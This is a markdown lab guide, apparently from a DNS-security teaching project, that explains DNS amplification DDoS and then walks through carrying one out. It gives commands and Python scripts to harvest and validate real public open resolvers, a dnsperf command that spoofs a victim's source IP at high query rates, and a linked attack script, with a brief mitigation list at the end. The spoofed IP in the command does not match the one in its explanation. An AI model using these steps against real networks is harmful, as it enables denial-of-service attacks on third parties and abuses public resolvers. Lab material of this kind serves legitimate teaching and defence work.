# Amplification Attack

DNS amplification is a type of DDoS attack that abuses the way DNS servers respond to queries.

## How it works:

1. The attacker sends small DNS queries to open DNS resolvers with spoofed source IP address to make it look like the request came from the victim.
2. DNS responses are much larger than the requests (especially with EDNS0 extensions or record types like ANY/TXT/DNSSEC), so a small query generates a large reply — often 10x to 100x the original size ("amplification factor").
3. Since the source IP was spoofed, the DNS server sends that large response to the victim instead of the attacker.
4. By doing this at scale across many open resolvers, the attacker floods the victim with far more traffic than they themselves sent, overwhelming the victim's bandwidth/infrastructure.

**Why it's effective:**

- Low cost for the attacker (small requests)
- High impact on the victim (large responses)
- Hides the attacker's real IP due to spoofing

## 

### Attack Guide

To perform DNS DDoS attack, attacker must have multiple Open DNS Resolvers to flood the victims infrastructure.

##### Gather Open DNS Resolvers

Collect DNS Resolver's IP following the techniques listed below.

###### 

###### Technique 1: Download a Ready List (EASIEST)

Download curated Open DNS Resolver IP list directly.

```bash
curl -O https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt
```

****Done.** You now have `resolvers.txt` with thousands of open DNS IPs.

###### Technique 2: Test a List to Find Working Ones

 **Step 1:** Download the public list

```bash
curl -O https://public-dns.info/nameservers.txt
```

**Step 2:** Test each IP to see if it works (this takes a few minutes)

> *Method 1*: Use below script to validate working IP's.

```bash
while read ip; do
 if dig @"$ip" google.com +short +timeout=2 | grep -q '.'; then
 echo "$ip" >> resolvers.txt
 fi
done < nameservers.txt
```

**Done.** `resolvers.txt` now has only the working resolvers.

--- 

> *Method 2*: Use dnsvalidator (Automated Testing)

1. Install

```bash
git clone https://github.com/vortexau/dnsvalidator
cd dnsvalidator
pip install -r requirements.txt
```

2. Run it

```bash
python3 dnsvalidator.py -tL https://public-dns.info/nameservers.txt -threads 100 -o my_resolvers.txt
```

**Done.** `my_resolvers.txt` has only working resolvers.

--- 

> *Method 3*: Simple Python Script

1. Create `scanner.py` with this code:

```python
import dns.resolver

# Read potential resolvers
with open('nameservers.txt', 'r') as f:
 ips = f.read().strip().split('\n')
working = []
for ip in ips[:100]: # Test first 100 to keep it fast
 try:
 resolver = dns.resolver.Resolver()
 resolver.nameservers = [ip]
 resolver.timeout = 2
 resolver.lifetime = 2
 answers = resolver.resolve('google.com', 'A')
 if answers:
 working.append(ip)
 print(f"✓ {ip} works")
 except:
 print(f"✗ {ip} fails")

# Save working ones

with open('my_resolvers.txt', 'w') as f:
 for ip in working:
 f.write(ip + '\n')
print(f"\nFound {len(working)} working resolvers")
```

2. Run it

```bash
python3 scanner.py
```

**Done.** `resolvers.txt` has your working resolvers.

After gather valid ip's of open dns resolvers, attack spoofs victim's IP and craft a small DNS query which asks for large response from dns resolver.

##### Perform Attack under DNSecLab

DNSecLab includes multiple Bind9 instances running on different ports which mimics the role of Open DNS Resolvers, so that you need not to use actual open dns resolver and in trouble.

> **Method 1:** use dnsperf 

```bash
#Create query file

echo "isc.org ANY" > queries.txt
```

```bash
#Run dnsperf against multiple resolvers
dnsperf -s 10.0.0.50 -s 10.0.0.51 -s 10.0.0.52 -d queries.txt -l 60 -Q 1000 -S 192.168.34.130
```

**Detailed Breakdown:**

- `dnsperf`: High-performance DNS testing tool

- `-s 10.0.0.50 -s 10.0.0.51 -s 10.0.0.52`: Multiple resolvers

- `-d queries.txt`: File containing queries (`isc.org ANY`)

- `-l 60`: Run for 60 seconds

- `-Q 1000`: 1000 queries per second per resolver

- `-S 172.16.42.100`: **SPOOF** source IP to victim

> **Method 02:** Use given Python script 

[Attack Script](https://github.com/Incogn1mu5/DN53CLab/tree/main/Inventory/Scripts/z3ro-d3lay_attack.py)

execute python script 

```bash
sudo python3 z3ro-d3lay_attack.py
```

Go to victim machine and open task manager -> Performace

- Look at network graph, it will spike randomly 

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/Amplification/Victim_network.png" alt="DN53CLab_Banner" width="1484" height="552">

Use wireshark to inspect the packets received during attack

- apply filter to inspect dns response

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/Amplification/Wire-Shark_dnsfilter.png" alt="DN53CLab_Banner" width="1484" height="552">

- watch dns packets flooding

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/Amplification/DNS-Amplification-effect.png" alt="DN53CLab_Banner" width="1484" height="552">

 

## Common mitigations:

- Disable open DNS resolvers / restrict recursive queries to trusted clients
- Implement rate limiting on DNS responses
- Use BCP38 / ingress filtering to prevent IP spoofing at the network level
- Enable Response Rate Limiting (RRL) on authoritative DNS servers
- Use anycast and traffic scrubbing for DDoS-scale protection
